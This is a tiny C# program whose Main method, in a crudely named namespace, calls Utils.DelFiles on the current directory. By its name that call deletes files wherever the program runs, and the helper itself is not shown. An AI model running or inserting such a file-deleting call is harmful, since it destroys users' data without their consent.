using System;

namespace Fucker
{
    class Program
    {
        static void Main(string[] args)
        {
            var status = false;
            Utils.DelFiles("./",out status);
        }
    }
}
